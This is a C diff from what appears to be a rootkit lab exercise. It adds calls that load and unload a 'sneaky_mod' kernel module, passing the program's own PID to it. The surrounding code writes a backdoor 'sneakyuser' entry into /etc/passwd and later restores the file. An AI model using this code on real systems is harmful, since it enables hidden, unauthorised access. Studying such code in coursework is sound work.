@@ -22,7 +22,12 @@ int main() {
   fprintf(pswd, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
   fclose(pswd);
   // Step 3: Load sneaky kernel module using "insmod" command
-  
+  char insmodCmd[100];
+  sprintf(insmodCmd, "insmod sneaky_mod.ko pid=%d", getpid());
+  if (system(insmodCmd) != 0) {
+    perror("Cannot load sneaky_mod.ko");
+    exit(EXIT_FAILURE);
+  }
   // Step 4: Enter loop to read character from keyboard until 'q' is pressed
   struct termios old_term, new_term;
   tcgetattr(STDIN_FILENO, &old_term);
@@ -41,7 +46,10 @@ int main() {
   }
   tcsetattr(STDIN_FILENO, TCSANOW, &old_term);
   // Step 5: Unload sneaky kernel module using "rmmod" command
-  
+  if (system("rmmod sneaky_mod") != 0) {
+    perror("Cannot unload sneaky_mod");
+    exit(EXIT_FAILURE);
+  }
   // Step 6: restore /etc/passwd, remove /tmp/passwd
   if (system("cp /tmp/passwd /etc/passwd") != 0) {
     perror("Cannot restore /etc/passwd");
